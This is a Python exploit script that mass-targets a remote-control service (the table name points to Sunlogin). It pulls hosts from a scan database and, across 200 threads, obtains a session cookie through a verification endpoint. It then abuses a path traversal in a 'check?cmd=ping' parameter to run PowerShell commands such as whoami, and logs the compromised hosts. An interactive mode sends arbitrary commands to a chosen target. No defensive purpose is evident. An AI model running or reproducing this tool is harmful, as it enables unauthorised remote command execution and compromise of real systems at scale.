import http
import logging
import sys
from queue import Queue
from threading import Thread

import pymysql
import requests

logging.captureWarnings(True)

http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

TABLENAME = "xiangrikuires"  # 存储扫描结果的表
DATATABLENAME = "fofadata"  # 存储数据来源的表
HOST = "127.0.0.1"
MYSQLPORT = 3306
MYSQLUSER = "root"
MYSQLPASSWORD = "root"
DATABASE = "fofa"  # 数据库

def conn(ip, port, user, pwd, db):
    try:
        db = pymysql.connect(host=ip, port=port, user=user, password=pwd, database=db, connect_timeout=3)
        return [True, db]
    except Exception as e:
        return [False]


def getTarGet():
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE, DATATABLENAME
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select * from {};".format(DATATABLENAME))
        res = cursor.fetchall()
        cursor.close()
        database.close()
        return res


def init(tablename):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute(
            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),whoami varchar(100),primary key(id))charset=utf8;")
        database.commit()
        cursor.close()
        database.close()


def insert(tablename, url, ip, port,whoami):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select ip,port from {};".format(tablename))
        res = cursor.fetchall()
        b = True
        for i in res:
            if i['ip'] == ip and i['port'] == port:
                b = False
                break
        if b:
            cursor.execute(
                "insert into " + tablename + " (url,ip,port,whoami) VALUES ('{}','{}',{},'{}')".format(url,
                                                                                                               ip,
                                                                                                               port, whoami))
            database.commit()
        cursor.close()
        database.close()

def poc(ip,port,proxy):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", }
    target="http://"+ip+":"+str(port)+"/cgi-bin/rpc?action=verify-haras"
    try:
        r=requests.get(target,headers=headers,timeout=5,verify=False,proxies=proxy)
        if r.status_code==200:
            v=r.json()['verify_string']
            headers['Cookie']="CID="+v
            target2="http://"+ip+":"+str(port)+"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig"
            r2=requests.get(target2,headers=headers,timeout=5,verify=False,proxies=proxy)
            if r2.status_code==200 and "Windows" in r2.text:
                whoami="Unknown"
                r3=requests.get("http://"+ip+":"+str(port)+"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+whoami",headers=headers,timeout=5,verify=False,proxies=proxy)
                if r3.status_code==200 and r3.text.strip()!="":
                    whoami=r3.text.strip()
                insert(TABLENAME,target,ip,port,whoami)
                print(target+"\t"+whoami)
    except Exception as e:
        pass
def exp(url, cmd,proxy=None):
    if proxy is None:
        proxy = {}
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36", }
    t1 = url + "/cgi-bin/rpc?action=verify-haras"
    try:
        r = requests.get(t1, headers=headers, timeout=5, verify=False, proxies=proxy)
        if r.status_code == 200:
            v = r.json()['verify_string']
            headers['Cookie'] = "CID=" + v
            t2 = url+ "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+"+cmd
            r2 = requests.get(t2, headers=headers, timeout=5, verify=False, proxies=proxy)
            if r2.status_code==200:
                print(r2.text)
    except Exception as e:
        pass

class Pocer(Thread):
    def __init__(self, q):
        super().__init__()
        self.q = q

    def run(self):
        while not self.q.empty():
            try:
                t = self.q.get()
                ip = t.split(";;")[0]
                port = int(t.split(";;")[1])
                # proxy={'http':"127.0.0.1:9999"}
                proxy={}
                poc(ip,port,proxy)
            except Exception as e:
                pass
if __name__ == '__main__':
    args=sys.argv
    if len(args) == 1:
        url = input(">>>").strip()
        while 1:
            cmd = input("CMD>>>").strip()
            if cmd != "q" and cmd != "exit":
                exp(url, cmd)
            else:
                exit()
    else:
        ts = getTarGet()
        init(TABLENAME)
        q = Queue()
        for t in ts:
            ip = t['ip']
            port = t['port']
            q.put("%s;;%s" % (ip, port))
        threads = []
        for i in range(200):
            threads.append(Pocer(q))
        for t in threads:
            t.start()
        for t in threads:
            t.join()